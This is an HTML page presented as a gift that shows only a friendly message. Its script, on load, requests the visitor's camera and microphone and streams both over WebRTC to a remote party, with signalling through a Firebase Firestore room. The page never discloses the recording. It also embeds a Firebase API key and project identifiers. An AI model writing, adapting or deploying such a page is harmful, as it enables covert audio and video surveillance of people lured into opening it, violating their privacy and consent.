<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>megagift</title>

<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">

<style>
body{
margin:0;
background:#ff003f;
color:white;
font-family:Nunito;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
font-size:28px;
}
</style>
</head>

<body>

<div>i hope you like it :)</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
getFirestore,
doc,
setDoc,
onSnapshot,
collection,
addDoc
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyBVFBqpZLGOE5PN1hnRN4GNp3AHfjcHNxI",
authDomain: "megagift03.firebaseapp.com",
projectId: "megagift03",
storageBucket: "megagift03.firebasestorage.app",
messagingSenderId: "220522611453",
appId: "1:220522611453:web:95284da4a574518d26b494"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const pc = new RTCPeerConnection({
iceServers:[{urls:"stun:stun.l.google.com:19302"}]
});

// get camera
const stream = await navigator.mediaDevices.getUserMedia({
video:true,
audio:true
});

stream.getTracks().forEach(track=>{
pc.addTrack(track, stream);
});

const callRef = doc(db,"calls","megagift-room");
const offerCandidates = collection(db,"calls","megagift-room","offerCandidates");
const answerCandidates = collection(db,"calls","megagift-room","answerCandidates");

// send ICE
pc.onicecandidate = e=>{
if(e.candidate){
addDoc(offerCandidates, e.candidate.toJSON());
}
};

// create offer
const offer = await pc.createOffer();

await pc.setLocalDescription(offer);

await setDoc(callRef,{
offer:{
type:offer.type,
sdp:offer.sdp
}
});

// receive answer
onSnapshot(callRef, snapshot=>{
const data = snapshot.data();

if(data?.answer && !pc.currentRemoteDescription){

pc.setRemoteDescription(
new RTCSessionDescription(data.answer)
);

}
});

// receive ICE
onSnapshot(answerCandidates, snapshot=>{
snapshot.docChanges().forEach(change=>{
if(change.type==="added"){
pc.addIceCandidate(
new RTCIceCandidate(change.doc.data())
);
}
});
});

</script>

</body>
</html>
